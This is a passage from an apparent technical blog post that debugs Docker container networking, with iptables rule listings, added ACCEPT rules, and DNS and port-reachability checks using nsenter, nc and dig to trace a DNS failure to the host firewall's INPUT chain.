<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host:~$ sudo iptables --list FORWARD --verbose --numeric --line-numbers --table filter
</span><span class='line'>Chain FORWARD (policy DROP 0 packets, 0 bytes)
</span><span class='line'>num   pkts bytes target     prot opt in     out     source               destination
</span><span class='line'>1        0     0 DOCKER-USER  all  --  *      *       0.0.0.0/0            0.0.0.0/0
</span><span class='line'>2        0     0 DOCKER-ISOLATION-STAGE-1  all  --  *      *       0.0.0.0/0            0.0.0.0/0
</span><span class='line'>3        0     0 ACCEPT     all  --  *      corp0  0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED
</span><span class='line'>4        0     0 DOCKER     all  --  *      corp0  0.0.0.0/0            0.0.0.0/0
</span><span class='line'>5        0     0 ACCEPT     all  --  corp0 !corp0  0.0.0.0/0            0.0.0.0/0
</span><span class='line'>6        0     0 ACCEPT     all  --  corp0 corp0  0.0.0.0/0            0.0.0.0/0
</span><span class='line'>7        0     0 ACCEPT     all  --  *      br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED
</span><span class='line'>8        0     0 ACCEPT     all  --  br-8ce7e363e4f9 br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0
</span><span class='line'>9      264 17722 DOCKER     all  --  *      br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0
</span><span class='line'>10    7382   17M ACCEPT     all  --  br-8ce7e363e4f9 !br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0</span></code></pre></td></tr></table></div></figure>


<p>When I re-ran Puppet rules 7 and 8 were deleted and containers on the <code>foo-network</code> were again
unable to establish a TCP connection. I added rule 8 manually and confirmed this is the rule
causing my error above.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host:~$ sudo iptables --table filter --append FORWARD --in-interface br-8ce7e363e4f9 --out-interface br-8ce7e363e4f9 --source 0.0.0.0/0 --destination 0.0.0.0/0 --jump ACCEPT
</span><span class='line'>
</span><span class='line'>dxia@my-host:~$ sudo iptables --list FORWARD --verbose --numeric --line-numbers --table filter
</span><span class='line'>Chain FORWARD (policy DROP 0 packets, 0 bytes)
</span><span class='line'>num   pkts bytes target     prot opt in     out     source               destination
</span><span class='line'>1    23526 1377K DOCKER-USER  all  --  *      *       0.0.0.0/0            0.0.0.0/0
</span><span class='line'>2    23526 1377K DOCKER-ISOLATION-STAGE-1  all  --  *      *       0.0.0.0/0            0.0.0.0/0
</span><span class='line'>3    11728  755K ACCEPT     all  --  *      corp0  0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED
</span><span class='line'>4        1    60 DOCKER     all  --  *      corp0  0.0.0.0/0            0.0.0.0/0
</span><span class='line'>5    11737  617K ACCEPT     all  --  corp0 !corp0  0.0.0.0/0            0.0.0.0/0
</span><span class='line'>6        0     0 ACCEPT     all  --  corp0 corp0  0.0.0.0/0            0.0.0.0/0
</span><span class='line'>7      182 12970 DOCKER     all  --  *      br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0
</span><span class='line'>8       39  2748 ACCEPT     all  --  br-8ce7e363e4f9 !br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0
</span><span class='line'>9        0     0 ACCEPT     all  --  br-8ce7e363e4f9 br-8ce7e363e4f9  0.0.0.0/0            0.0.0.0/0
</span><span class='line'>
</span><span class='line'>dxia@my-host:~$ sudo nsenter --net=$(docker inspect --format  nginx1) nc 172.20.0.127 80 -nvz -w 5
</span><span class='line'>(UNKNOWN) [172.20.0.127] 80 (http) open</span></code></pre></td></tr></table></div></figure>


<p>Now running <code>foo</code> gave a different error.</p>

<h2>Error #2: DNS queries for external records from bar failed</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host$ foo run -f data-info.yaml -w DumpKubernetesContainerImagesJob -p 2021-04-26 -r my-project/target/image-name
</span><span class='line'>INFO:run: starting workflow DumpKubernetesContainerImagesJob ...
</span><span class='line'>ERROR: (gcloud.auth.activate-service-account) There was a problem refreshing your current auth tokens: Invalid response 500.
</span><span class='line'>Please run:
</span><span class='line'>
</span><span class='line'>  $ gcloud auth login
</span><span class='line'>
</span><span class='line'>to obtain new credentials.
</span><span class='line'>
</span><span class='line'>If you have already logged in with a different account:
</span><span class='line'>
</span><span class='line'>    $ gcloud config set account ACCOUNT
</span><span class='line'>
</span><span class='line'>to select an already authenticated account to use.
</span><span class='line'>Traceback (most recent call last):
</span><span class='line'>  File "/usr/local/bin/activate-google-application-credentials", line 19, in &lt;module&gt;
</span><span class='line'>    'auth', 'activate-service-account', '--key-file', json_path])
</span><span class='line'>  File "/usr/lib/python3.6/subprocess.py", line 311, in check_call
</span><span class='line'>    raise CalledProcessError(retcode, cmd)
</span><span class='line'>subprocess.CalledProcessError: Command '['gcloud', 'auth', 'activate-service-account', '--key-file', '/etc/_foo/gcp-sa-key.json']' returned non-zero exit status 1.
</span><span class='line'>ERROR:foo: non-zero exit code (1) from `/usr/bin/docker run -it -v /home/dxia/my-project/_foo:/etc/_foo:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python2.7/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.6/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.7/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.8/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.9/dist-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python2.7/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.6/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.7/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.8/site-packages/oauth2client/__init__.py:ro -v /home/dxia/my-project/_foo/__init__.py:/usr/local/lib/python3.9/site-packages/oauth2client/__init__.py:ro --net foo-network -e FOO_COMPONENT_ID=my-project -e FOO_WORKFLOW_ID=DumpKubernetesContainerImagesJob -e FOO_PARAMETER=2021-04-02 -e FOO_DOCKER_IMAGE=my-project:20210422T065801-2b5452d -e 'FOO_DOCKER_ARGS=wrap-luigi --module luigi_tasks DumpKubernetesContainerImagesJob --when 2021-04-02' -e FOO_EXECUTION_ID=foorun-3feaee45-35e4-4c01-9430-86de52eb2db1 -e FOO_TRIGGER_ID=foo-f721de7f-edf9-4bb3-8cdf-1e9bbcec5035 -e FOO_TRIGGER_TYPE=foo -e FOO_ENVIRONMENT=foo -e FOO_LOGGING=text -e GOOGLE_APPLICATION_CREDENTIALS=/etc/_foo/gcp-sa-key.json -e FOO_SERVICE_ACCOUNT=dump-k8-deployment-info-pipeli@my-project.iam.gserviceaccount.com gcr.io/xpn-1/my-project:20210422T065801-2b5452d wrap-luigi --module luigi_tasks DumpKubernetesContainerImagesJob --when 2021-04-02`</span></code></pre></td></tr></table></div></figure>


<p>The only background knowledge we need to know here is that the qux container is sending a Google
Service Account (GSA) JSON credential with <code>"token_uri": "http://172.20.0.127:80/token"</code>. Bar
then uses that token for further GCP API requests. So bar needs to query DNS for
accounts.google.com. Bar container logs show that it cannot lookup the DNS A record for
accounts.google.com by querying <code>127.0.0.11:53</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host:~$ docker ps
</span><span class='line'>CONTAINER ID        IMAGE                                                                    COMMAND                  CREATED             STATUS              PORTS                     NAMES
</span><span class='line'>1b0b2b981f93        nginx:latest                                                             "/docker-entrypoint.…"   9 hours ago         Up 9 hours          0.0.0.0:8080-&gt;80/tcp      nginx1
</span><span class='line'>3f9cc17b3f71        foo/bar:latest                                   "./bar"               9 hours ago         Up 9 hours          0.0.0.0:80-&gt;80/tcp        bar
</span><span class='line'>
</span><span class='line'>dxia@my-host:~$ docker logs --follow bar
</span><span class='line'>2021/04/22 05:54:19 bar started
</span><span class='line'>2021/04/22 06:59:13 Received JWT assertion: [REDACTED base-64 string]
</span><span class='line'>2021/04/22 06:59:13 Servive account name:  projects/-/serviceAccounts/dump-k8-deployment-info-pipeli@my-project.iam.gserviceaccount.com
</span><span class='line'>2021/04/22 06:59:28 Post https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/dump-k8-deployment-info-pipeli@my-project.iam.gserviceaccount.com:generateAccessToken?alt=json&prettyPrint=false: Post https://accounts.google.com/o/oauth2/token: dial tcp: lookup accounts.google.com on 127.0.0.11:53: read udp 127.0.0.1:46920-&gt;127.0.0.11:53: i/o timeout
</span><span class='line'>2021/04/22 06:59:28 Failed to create new token for dump-k8-deployment-info-pipeli@my-project.iam.gserviceaccount.com</span></code></pre></td></tr></table></div></figure>


<p>I wondered why bar was querying <code>127.0.0.11</code> for DNS. It turns out this is another loopback
address. In fact, all of <code>127.0.0.0/8</code> is loopback according to <a href="https://tools.ietf.org/html/rfc6890">RFC-6890</a>. I guess Docker
containers that are attached to user-defined Docker networks are configured by default to use
<code>127.0.0.11</code> in their <code>/etc/resolv.conf</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host$ docker ps
</span><span class='line'>CONTAINER ID        IMAGE                                                                    COMMAND                  CREATED             STATUS              PORTS                     NAMES
</span><span class='line'>1b0b2b981f93        nginx:latest                                                             "/docker-entrypoint.…"   9 hours ago         Up 9 hours          0.0.0.0:8080-&gt;80/tcp      nginx1
</span><span class='line'>3f9cc17b3f71        foo/bar:latest                                   "./bar"               9 hours ago         Up 9 hours          0.0.0.0:80-&gt;80/tcp        bar
</span><span class='line'>
</span><span class='line'>dxia@my-host$ docker exec -it nginx1 /bin/sh -c "cat /etc/resolv.conf"
</span><span class='line'>
</span><span class='line'>search corp.net
</span><span class='line'>nameserver 127.0.0.11
</span><span class='line'>options attempts:1 timeout:5 ndots:0</span></code></pre></td></tr></table></div></figure>


<p>Why were these Docker containers configured to query for DNS records on <code>127.0.0.11</code>? It turned
out after some Googling that</p>

<blockquote><p>By default, a container inherits the DNS settings of the host, as defined in the /etc/resolv.conf
configuration file. Containers that use the default bridge network get a copy of this file,
whereas containers that use a custom network use Docker’s embedded DNS server, which forwards
external DNS lookups to the DNS servers configured on the host.</p></blockquote>

<p>&mdash; <a href="https://docs.docker.com/config/containers/container-networking/">https://docs.docker.com/config/containers/container-networking/</a></p>

<p>Now I wondered if Docker&rsquo;s embedded DNS server is actually running. After some more Googling, I
realized that each container also had its own set of firewall rules. So I listed bar&rsquo;s nat
table&rsquo;s <code>DOCKER_OUTPUT</code> chain&rsquo;s rules. These two rules showed that the destination port is
changed for TCP packets bound for 127.0.0.11:53 to 37619. UDP packets have their port changed to
58552.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host$ sudo nsenter -n -t $(docker inspect --format  bar) sudo iptables --list DOCKER_OUTPUT --verbose --numeric --line-numbers --table nat
</span><span class='line'>
</span><span class='line'>Chain DOCKER_OUTPUT (1 references)
</span><span class='line'> pkts bytes target     prot opt in     out     source               destination
</span><span class='line'>    0     0 DNAT       tcp  --  *      *       0.0.0.0/0            127.0.0.11           tcp dpt:53 to:127.0.0.11:37619
</span><span class='line'>    0     0 DNAT       udp  --  *      *       0.0.0.0/0            127.0.0.11           udp dpt:53 to:127.0.0.11:58552</span></code></pre></td></tr></table></div></figure>


<p>Whatever&rsquo;s listening on those ports was accepting TCP and UDP connections.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host$ sudo nsenter -n -t $(docker inspect --format  bar) nc 127.0.0.11 58552 -nvzu -w 5
</span><span class='line'>(UNKNOWN) [127.0.0.11] 58552 (?) open
</span><span class='line'>dxia@my-host$ sudo nsenter -n -t $(docker inspect --format  bar) nc 127.0.0.11 37619 -nvz -w 5
</span><span class='line'>(UNKNOWN) [127.0.0.11] 37619 (?) open</span></code></pre></td></tr></table></div></figure>


<p>But there was no DNS reply from either.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host$ sudo nsenter -n -t $(docker inspect --format  bar) dig @127.0.0.11 -p 58552 accounts.google.com
</span><span class='line'>
</span><span class='line'>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.14-Ubuntu &lt;&lt;&gt;&gt; @127.0.0.11 -p 58552 accounts.google.com
</span><span class='line'>; (1 server found)
</span><span class='line'>;; global options: +cmd
</span><span class='line'>;; connection timed out; no servers could be reached
</span><span class='line'>
</span><span class='line'>dxia@my-host$ sudo nsenter -n -t $(docker inspect --format  bar) dig @127.0.0.11 -p 37619 accounts.google.com +tcp
</span><span class='line'>
</span><span class='line'>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.14-Ubuntu &lt;&lt;&gt;&gt; @127.0.0.11 -p 37619 accounts.google.com +tcp
</span><span class='line'>; (1 server found)
</span><span class='line'>;; global options: +cmd
</span><span class='line'>;; connection timed out; no servers could be reached</span></code></pre></td></tr></table></div></figure>


<p>Docker daemon was listening for DNS queries at that IP and port from within bar.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host$ sudo nsenter -n -p -t $(docker inspect --format  bar) ss -utnlp
</span><span class='line'>Netid        State          Recv-Q         Send-Q                    Local Address:Port                    Peer Address:Port
</span><span class='line'>udp          UNCONN         0              0                            127.0.0.11:58552                        0.0.0.0:*             users:(("dockerd",pid=10984,fd=38))
</span><span class='line'>tcp          LISTEN         0              128                          127.0.0.11:37619                        0.0.0.0:*             users:(("dockerd",pid=10984,fd=40))
</span><span class='line'>tcp          LISTEN         0              128                                   *:80                                 *:*             users:(("bar",pid=12150,fd=3))</span></code></pre></td></tr></table></div></figure>


<p>After enabling <code>log-level": "debug"</code> in <code>/etc/docker/daemon.json</code> and reloading the configuration
file, I saw that the daemon was trying to forward the DNS query to 10.99.0.1. This was the IP of
the <code>corp0</code> bridge network interface which we create instead of the default <code>docker0</code> bridge
network. I saw there was an IO timeout when the daemon was waiting for the DNS reply.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host$ sudo journalctl --follow -u docker
</span><span class='line'>-- Logs begin at Tue 2019-11-05 18:17:27 UTC. --
</span><span class='line'>Apr 22 15:43:12 my-host.corp.net dockerd[10984]: time="2021-04-22T15:43:12.496979903Z" level=debug msg="[resolver] read from DNS server failed, read udp 172.20.0.127:37928-&gt;10.99.0.1:53: i/o timeout"
</span><span class='line'>Apr 22 15:43:13 my-host.corp.net dockerd[10984]: time="2021-04-22T15:43:13.496539033Z" level=debug msg="Name To resolve: accounts.google.com."
</span><span class='line'>Apr 22 15:43:13 my-host.corp.net dockerd[10984]: time="2021-04-22T15:43:13.496958664Z" level=debug msg="[resolver] query accounts.google.com. (A) from 172.20.0.127:51642, forwarding to udp:10.99.0.1"</span></code></pre></td></tr></table></div></figure>


<p>We set dockerd&rsquo;s upstream DNS server as 10.99.0.1 because we have unbound running as a DNS
proxy/cache on the host. We configured it to bind on the bridge interface so Docker containers
can hit the host-local unbound instance by routing DNS requests to corp0.</p>

<p>So why can&rsquo;t the daemon forward IP packets from 172.20.0.127:37928 to 10.99.0.1:53? It seemed
like UDP packets sent from bar were able to reach 10.99.0.1:53, but DNS requests failed. I also
knew DNS requests from the host to 10.99.0.1:53 worked.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host:~$ sudo nsenter -n -t $(docker inspect --format  bar) nc 10.99.0.1 53 -nvzu -w 5
</span><span class='line'>(UNKNOWN) [10.99.0.1] 53 (domain) open
</span><span class='line'>
</span><span class='line'>dxia@my-host:~$ sudo nsenter -n -t $(docker inspect --format  bar) dig @10.99.0.1 accounts.google.com
</span><span class='line'>
</span><span class='line'>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.14-Ubuntu &lt;&lt;&gt;&gt; @10.99.0.1 accounts.google.com
</span><span class='line'>; (1 server found)
</span><span class='line'>;; global options: +cmd
</span><span class='line'>;; connection timed out; no servers could be reached
</span><span class='line'>
</span><span class='line'>dxia@my-host:~$ dig @10.99.0.1 accounts.google.com
</span><span class='line'>
</span><span class='line'>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.14-Ubuntu &lt;&lt;&gt;&gt; @10.99.0.1 accounts.google.com
</span><span class='line'>; (1 server found)
</span><span class='line'>;; global options: +cmd
</span><span class='line'>;; Got answer:
</span><span class='line'>;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 39308
</span><span class='line'>;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
</span><span class='line'>
</span><span class='line'>;; OPT PSEUDOSECTION:
</span><span class='line'>; EDNS: version: 0, flags:; udp: 4096
</span><span class='line'>;; QUESTION SECTION:
</span><span class='line'>;accounts.google.com.     IN  A
</span><span class='line'>
</span><span class='line'>;; ANSWER SECTION:
</span><span class='line'>accounts.google.com.  108 IN  A   142.250.31.84
</span><span class='line'>
</span><span class='line'>;; Query time: 1 msec
</span><span class='line'>;; SERVER: 10.99.0.1#53(10.99.0.1)
</span><span class='line'>;; WHEN: Mon Apr 26 23:58:28 UTC 2021
</span><span class='line'>;; MSG SIZE  rcvd: 64</span></code></pre></td></tr></table></div></figure>


<p>My hypothesis at this point was that Docker&rsquo;s embedded DNS server wasn&rsquo;t working in some way.
After exploring this for a while with no luck, I questioned my assumption that UDP packets from
172.20.0.127:37928 were able to reach 10.99.0.1:53. I realized TCP packets from
172.20.0.127:37928 were not able to reach 10.99.0.1:53.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host:~$ sudo nsenter -n -t $(docker inspect --format  bar) nc 10.99.0.1 53 -nvz -w 5
</span><span class='line'>(UNKNOWN) [10.99.0.1] 53 (domain) : Connection timed out</span></code></pre></td></tr></table></div></figure>


<p>So why were UDP packets able to? Isn&rsquo;t UDP a fire-and-forget protocol? How can <code>nc</code> even tell if
an IP and port is listening for UDP packets at all? It was good that I backtracked and questioned
my assumption because it turns out that one <a href="https://serverfault.com/questions/416205/testing-udp-port-connectivity/416269#416269">cannot distinguish between an open UDP port and
dropped packets en route to that port</a>.</p>

<p>So it must be another networking issue which means there must be another firewall rule that&rsquo;s
blocking packets from the bar container to 10.99.0.1. After a while of looking, I realized the
filter table&rsquo;s <code>INPUT</code> chain&rsquo;s default policy was <code>DROP</code> and that there was no rule that matched
packets coming in from the <code>br-8ce7e363e4f9</code> interface.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host:~$ sudo iptables --list INPUT --verbose --numeric --line-numbers --table filter
</span><span class='line'>Chain INPUT (policy DROP 0 packets, 0 bytes)
</span><span class='line'>num   pkts bytes target     prot opt in     out     source               destination
</span><span class='line'>1     434M  345G            all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 00 ACC-eth0 input */
</span><span class='line'>2        0     0            all  --  eth1   *       0.0.0.0/0            0.0.0.0/0            /* 00 ACC-eth1 input */
</span><span class='line'>3     7080  283K DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 000 drop invalid */ ctstate INVALID
</span><span class='line'>4    1907M  568G ipthrouput  all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 000 track forward */
</span><span class='line'>5     987M  414G ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 001 accept established */ ctstate RELATED,ESTABLISHED
</span><span class='line'>6     763M   95G ACCEPT     all  --  lo     *       0.0.0.0/0            0.0.0.0/0            /* 002 allow local */
</span><span class='line'>7        0     0 ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 003 accept ipsec */ policy match dir in pol ipsec
</span><span class='line'>8        1    28 ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0            /* 004 allow icmp */ icmptype 8 limit: avg 10/sec burst 5
</span><span class='line'>9        0     0 DROP       icmp --  *      *       0.0.0.0/0            0.0.0.0/0            /* 005 drop icmp */
</span><span class='line'>10       0     0 DROP       tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            multiport dports 9203 /* 006 block JMX on service net */
</span><span class='line'>11       0     0 REJECT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            multiport dports 9203 /* 020 deny direct access to JMX port on helios nodes */ reject-with icmp-port-unreachable
</span><span class='line'>12       0     0 DROP       all  --  eth0   *       10.48.64.0/22        0.0.0.0/0            /* 08 drop traffic from osxenv 10.48.64.0/22 */
</span><span class='line'>13       0     0 DROP       all  --  eth0   *       10.97.16.0/21        0.0.0.0/0            /* 08 drop traffic from osxenv 10.97.16.0/21 */
</span><span class='line'>14       0     0 DROP       all  --  eth0   *       172.24.32.0/22       0.0.0.0/0            /* 08 drop traffic from windowsbuildagentsenv 172.24.32.0/22 */
</span><span class='line'>15       0     0 DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 08 prevent access from buildagent machines */ match-set buildagent src
</span><span class='line'>16       0     0 DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 08 prevent access from paymentbamboo machines */ match-set paymentbamboo src
</span><span class='line'>17   18168 1094K ACCEPT     all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 09 allow service nets */ match-set service_nets src
</span><span class='line'>18     134  8496 ACCEPT     all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 09 allow tech offices */ match-set tech_offices src
</span><span class='line'>19       0     0 ACCEPT     all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 09 allow testenv */ match-set testenv src
</span><span class='line'>20       0     0 ACCEPT     all  --  eth0   *       130.211.0.0/22       0.0.0.0/0            /* 10 Google networks for 130.211.0.0/22 */
</span><span class='line'>21       0     0 ACCEPT     all  --  eth0   *       35.191.0.0/16        0.0.0.0/0            /* 10 Google networks for 35.191.0.0/16 */
</span><span class='line'>22       0     0 LOG        tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 11 inbound eth0: */ limit: avg 3/min burst 5 LOG flags 0 level 4 prefix "input eth0: "
</span><span class='line'>23       0     0 LOG        tcp  --  eth1   *       0.0.0.0/0            0.0.0.0/0            /* 11 inbound eth1: */ limit: avg 3/min burst 5 LOG flags 0 level 4 prefix "input eth1: "
</span><span class='line'>24       0     0 ACCEPT     all  --  docker0 *       0.0.0.0/0            0.0.0.0/0            /* 20 allow all docker0 traffic */
</span><span class='line'>25    158M   59G ACCEPT     all  --  corp0 *       0.0.0.0/0            0.0.0.0/0            /* 20 allow all corp0 traffic */
</span><span class='line'>26       0     0 ACCEPT     tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            multiport dports 22 /* 500 allow ssh on service net */ ctstate NEW recent: SET name: DEFAULT side: source mask: 255.255.255.255
</span><span class='line'>27       0     0 DROP       tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            multiport dports 22 /* 501 limit ssh on service net */ ctstate NEW recent: UPDATE seconds: 180 hit_count: 20 name: DEFAULT side: source mask: 255.255.255.255</span></code></pre></td></tr></table></div></figure>


<p>So I added a matching rule that accepted those packets manually.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sudo iptables --table filter --append INPUT --in-interface br-8ce7e363e4f9 --source 0.0.0.0/0 --destination 0.0.0.0/0 --jump ACCEPT
</span><span class='line'>
